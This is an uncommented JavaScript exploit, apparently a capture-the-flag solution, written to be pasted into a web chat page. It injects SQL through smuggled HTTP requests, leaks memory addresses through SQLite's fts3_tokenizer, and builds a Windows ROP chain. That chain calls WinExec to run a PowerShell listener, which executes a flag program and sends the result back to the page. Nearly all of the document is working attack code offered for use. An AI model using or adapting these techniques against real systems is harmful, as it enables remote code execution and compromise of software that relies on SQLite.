<!-- copy & paste this into chat -->

<script>
var baseURL = document.querySelector('#frame').src;

String.prototype.repeat = function(x) { return new Array(x + 1).join(this); };
String.prototype.ljust = function(x, y) { return this + new Array(x + 1 - this.length).join(y); };

var sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

var request = keyword => {
    return new Promise(resolve => {
        const event_handler = (event) => {
            window.removeEventListener('message', event_handler);
            resolve(event.data);
        };
        window.addEventListener('message', event_handler);
        send_to_backend(keyword);
    })
};

var oracle = keyword => {
    return new Promise(async(resolve) => {
        var data = await request(keyword);
        resolve(data.trim() !== 'Nope' ? data : false)
    })
};

var decodeHex = str => {
    var x = [];
    for (var i = 0; i < str.length; i += 2) {
        x.push(parseInt(str.substr(i, 2), 16))
    };
    return x;
};

var encodeHex = str => {
    var s = '';
    for (var i = 0; i < str.length; i++) {
        var x = str[i].charCodeAt(0).toString(16);
        if (x.length == 1) x = '0' + x;
        s += x
    };
    return s;
};
var u64 = payload => payload.reverse().reduce((x, y) => x.multiply(256).add(y), bigInt(0));
var p64 = payload => {
    var s = '';
    for (var i = 0; i < 8; i++) {
        s += String.fromCharCode(payload.shiftRight(i * 8).mod(256));
    };
    return s;
};

var go = (payload) => {
    var xhr = new XMLHttpRequest();
    var buffer = new Uint8Array(payload.length);
    payload.split('').forEach(
        (x, y) => buffer[y] = x.charCodeAt(0)
    );
    xhr.open('POST', baseURL + 'a'.repeat(0x263), true);
    xhr.send(buffer);
};

var injection = async function(query, keyword, suffix) {
    suffix = suffix || '';
    pay1 = "PUT /register?id=" + "*".repeat(64) + "&pw=" + "b".repeat(1) + " \r\n" + suffix;
    pay2 = "GET /search?userid=1&search=" + "*".repeat(70) + "aaa',1);" + query.trim().replace(/ /g, '%20').replace(/\n/g, '') + "--" + " HTTP/1.1\r\n";
    pay1 = pay1.ljust(1024, '\x00').repeat(100);
    pay2 = pay2.ljust(1024, '\x00').repeat(100);
    r = await oracle(keyword);
    if (r !== false) return r;
    while (1) {
        console.log('Executing :', query.length);
        console.log(query);
        for (let i = 0; i < 80; i++) {
            go(pay1);
            go(pay2);
        };
        await sleep(8);
        r = await oracle(keyword);
        if (r !== false) return r;
    };
};

var exploit = async() => {
    data = await injection(`
create virtual table a using fts3(b);
insert into a values(x'');
INSERT INTO chat_table VALUES(1,'l',(select hex(a||fts3_tokenizer('simple')) from a)); `, 'l');

    [heap, base] = [u64(decodeHex(data.substr(0, 16))), u64(decodeHex(data.substr(16, 16)))];

    base = base.subtract(0x15A688);
    heap = base.add(0x18dff0);

    tokenizer = rsp = base.add(0xda6ac);
    rax = base.add(0xc47d); /*: pop rax; ret*/
    rcx = base.add(0x2c356); /*: pop rcx; ret*/
    rdx = base.add(0x11563); /*: pop rdx; ret*/
    rbx = base.add(0x6dbe);  /*: pop rbx ; ret*/
    ret = base.add(0x10dd);  /*: ret*/
    rsirbp = base.add(0x7a3b);  /*: pop rsi ; pop rbp ; ret*/
    write = base.add(0xadacd); /*: mov qword ptr[rax + 0x10], rcx; ret*/
    pr = base.add(0x3324f);  /*: add rsp, 8 ; ret*/
    rsp0x28 = base.add(0x825b);  /*: add rsp, 0x20 ; pop rbx ; ret*/
    jmpptrrbx = base.add(0x68335);  /*: jmp qword ptr [rbx]*/

    await injection(`
PRAGMA soft_heap_limit=${tokenizer};
insert into chat_table VALUES(1,'S',1);
`, 'S');

    cmd = 'powershell.exe $L=New-Object System.Net.HttpListener;$L.Prefixes.Add(\'http://localhost:31337/\');$L.Start();$X=$L.GetContext();$C=[System.Text.Encoding]::UTF8.GetBytes("""postMessage(``$((cmd.exe /c C:\\get_flag.exe cykor))``,``*``)""");$X.Response.OutputStream.Write($C, 0, $C.Length);$X.Response.Close()';
    cmd += '\x00';

    tokenizer_ptr = p64(base.add(0x190898 - 8));

    procname = 'WinExec\x00';
    try_get_module = base.add(0x101704);
    get_proc_address = base.add(0xf6c76);
    exit_thread = base.add(0x14cd13);

    rop = p64(rax) + p64(heap.subtract(0x10));
    rop += p64(rcx) + procname.substr(0, 8);
    rop += p64(write);

    rop += p64(rcx) + p64(bigInt(2));
    rop += p64(ret) + p64(try_get_module);
    rop += p64(rsp0x28) + 'a'.repeat(0x20) + p64(ret);

    rop += p64(rsirbp) + p64(pr) + p64(pr);
    //8388f : mov r8, rsi ; inc rdx ; call rbp
    //79c8f : mov rcx, rax ; call r8
    rop += p64(base.add(0x8388f)) + p64(base.add(0x79c8f));
    rop += p64(rdx) + p64(heap);
    rop += p64(get_proc_address);
    rop += p64(rsp0x28) + 'a'.repeat(0x20) + p64(ret);

    //52a7a : mov qword ptr [rbx], rax ; mov rbx, qword ptr [rsp + 8] ; ret
    rop += p64(rbx) + p64(heap) + p64(base.add(0x52a7a));
    //11268 : pop r13 ; ret
    rop += p64(rbx) + p64(pr) + p64(base.add(0x11268)) + p64(pr);
    //09ed6 : pop r12 ; ret
    //0a26a : mov r9, r13 ; call r12
    //0a6e63 : lea rdx, qword ptr [rsp + 0x30] ; call rbx
    //12aec : mov rcx, rdx ; call r9
    rop += p64(base.add(0x9ed6)) + p64(pr) + p64(base.add(0xa26a)) + p64(base.add(0xa6e63)) + p64(base.add(0x12aec));
    //13cc7f : add rcx, 0x10 ; mov rax, rcx ; ret
    rop += p64(rdx) + p64(bigInt(5)) + p64(base.add(0x13bc7f)).repeat(8) + p64(rbx) + p64(heap) + p64(ret) + p64(jmpptrrbx);

    rop += p64(bigInt(exit_thread)) + p64(bigInt(0)).repeat(6) + cmd;

    trigger = await injection(`
select fts3_tokenizer('simple', x'${encodeHex(tokenizer_ptr)}');
create virtual table b using fts3(c);--chat
`, 'crash', '\x00'.repeat(7) + rop);
};

var cnt = 0;
window.addEventListener('message', function(event) {
    if (event.data.trim() == 'Login success!') exploit();
});

start = async function() {
    if (!(await request('/login a b')).toLowerCase().indexOf('success') !== -1)
        await request('/join a b');

    await request('/login a b');
};

setInterval(function() {
	$(document.body).append($('<script src="http://localhost:31337"><\/script>'))
}, 1000);

start();
</script>
